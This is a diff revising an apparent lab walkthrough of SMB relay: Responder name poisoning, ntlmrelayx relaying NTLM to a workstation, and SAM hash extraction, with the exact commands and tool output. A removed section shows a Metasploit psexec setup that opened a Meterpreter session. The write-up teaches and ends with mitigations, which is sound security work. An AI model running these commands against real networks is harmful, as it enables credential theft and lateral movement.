@@ -66,13 +66,13 @@ If the legitimate DNS infrastructure does not answer, an attacker on the local n
 
 ### 2.2 Poisoning
 
-Responder answers the victim's request and tells it that the requested host is the attacker's IP:
+Responder answers the request and supplies the attacker's IP address for the requested name:
 
 ```text
 FILESERVER -> 192.168.56.1
 ```
 
-The victim therefore attempts to connect to the attacker.
+The victim therefore attempts to establish the SMB connection with the attacker.
 
 ### 2.3 NTLM authentication
 
@@ -120,26 +120,24 @@ A useful verification command is:
 nmap -Pn -p445 --script smb2-security-mode 192.168.56.20
 ```
 
-Expected relayable configuration:
+The correct scan of CTO produced:
 
 ```text
-Message signing enabled but not required
+Host is up.
+
+445/tcp open microsoft-ds
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|     Message signing enabled but not required
 ```
 
-### Important note about the captured screenshot
+This confirms that CTO's SMB signing configuration is compatible with the relay scenario.
 
-The supplied Nmap screenshot shows:
+![SMB signing status on CTO](Images/nmap-mode-script.png)
 
-```text
-192.168.56.10
-Message signing enabled and required
-```
-
-That is the **Domain Controller**, not CTO.
-
-Therefore, that screenshot demonstrates the DC's SMB-signing configuration, but it does **not** establish whether `192.168.56.20` is relayable. The relay target must be checked separately.
-
-![SMB security mode check](Images/nmap-mode-script.png)
+> **Important:** The earlier scan against `192.168.56.10` (DC1) showed `Message signing enabled and required`. That was the Domain Controller, not the relay target, so it should not be used as evidence for the relayability of CTO.
 
 ---
 
@@ -148,7 +146,7 @@ Therefore, that screenshot demonstrates the DC's SMB-signing configuration, but 
 The relay listener was started against CTO:
 
 ```bash
-sudo ntlmrelayx.py -t smb://192.168.56.20 -smb2support
+sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
 or, when using a target file:
@@ -206,10 +204,10 @@ Otherwise another SMB service can receive the connection instead of ntlmrelayx.
 Responder was started on the attacker interface:
 
 ```bash
-sudo responder -I eth0 -v
+sudo responder -I <lab-interface> -v
 ```
 
-In the VirtualBox-based lab, the relevant interface was the host-only network interface.
+In the VirtualBox-based lab, the relevant interface is the interface associated with the `192.168.56.0/24` host-only network.
 
 The important configuration is:
 
@@ -296,13 +294,7 @@ for name fileserver.local
 
 This means the poisoning stage is functioning.
 
-The victim believes that the requested SMB host is:
-
-```text
-192.168.56.1
-```
-
-rather than the nonexistent legitimate host.
+The victim receives the spoofed name-resolution response and therefore attempts to establish the SMB connection with `192.168.56.1`.
 
 ![Responder poisoning events](Images/starting-responder-ntlmrelayx.png)
 
@@ -414,6 +406,12 @@ Restoring the disabled state for service RemoteRegistry
 
 ![SAM hash extraction](Images/hash-capt.png)
 
+### Why SAM extraction was possible
+
+The SAM extraction was possible because the relayed `EVIL\ggideon` identity had local administrative privileges on CTO.
+
+SMB relay alone does **not** automatically provide access to the target's SAM database. The relayed account must have sufficient privileges on the target for the requested post-relay operation.
+
 ---
 
 ## 12. Captured SAM Hashes
@@ -466,11 +464,7 @@ The value:
 
 is the standard NT hash associated with an empty password and is commonly seen for disabled/default local accounts in SAM output.
 
-The interesting account in this lab is the custom local account:
-
-```text
-tyrell
-```
+The `tyrell` entry is a custom local account present on the target workstation.
 
 ---
 
@@ -603,38 +597,13 @@ Victim -> ntlmrelayx -> Target
 
 The SAM hashes appeared only after the successful relay was used for the SAM extraction stage.
 
----
+### Connection reset during repeated attempts
 
-## 16. Post-Exploitation Validation
-
-The supplied lab screenshots also show a separate Metasploit `psexec` test against CTO.
-
-The module was configured with:
-
-```text
-RHOST       192.168.56.20
-SMBDomain   evil.corp
-SMBUser     tyrell
-SMBPass     <lab password>
-LHOST       192.168.56.50
-LPORT       4444
-```
-
-and produced:
-
-```text
-Meterpreter session 1 opened
-```
-
-![Metasploit PsExec configuration](Images/msf-psexec.png)
-
-![Successful Meterpreter session](Images/msf-psexec-shell.png)
-
-**Note:** this screenshot demonstrates authenticated PsExec-based execution using a plaintext lab password. It should not be presented as proof that the SAM hash itself was used for Pass-the-Hash. A separate Pass-the-Hash test would be required to demonstrate that technique.
+During repeated authentication attempts, a `ConnectionResetError` was observed after the relay target had already been processed. This occurred during subsequent connections and did not invalidate the successful relay/SAM extraction demonstrated above.
 
 ---
 
-## 17. Attack Summary
+## 16. Attack Summary
 
 The important lesson from this exercise is that **SMB relay is not simply a hash-capture attack**.
 
@@ -668,6 +637,45 @@ The attack demonstrates why organizations should:
 - Restrict administrative access between workstations.
 - Monitor unusual NTLM authentication and SMB activity.
 - Protect and audit privileged accounts.
+
+---
+
+## 17. Attack Validation
+
+The successful run can be validated from the ntlmrelayx output:
+
+```text
+(SMB): Received connection from 192.168.56.30,
+attacking target smb://192.168.56.20
+
+(SMB): Authenticating connection from
+EVIL/GGIDEON@192.168.56.30
+against smb://192.168.56.20 SUCCEED [1]
+
+Target system bootKey: ...
+
+Dumping local SAM hashes
+
+Done dumping SAM hashes for host: 192.168.56.20
+```
+
+This provides evidence for the complete attack path:
+
+```text
+CYDECK
+  ↓
+LLMNR/NBT-NS poisoning
+  ↓
+NTLM authentication
+  ↓
+ntlmrelayx
+  ↓
+CTO
+  ↓
+SAM extraction
+```
+
+No separate Metasploit/PsExec execution is included in this walkthrough because that was a separate authenticated execution test rather than part of the demonstrated SMB relay → SAM extraction chain.
 
 ---
 
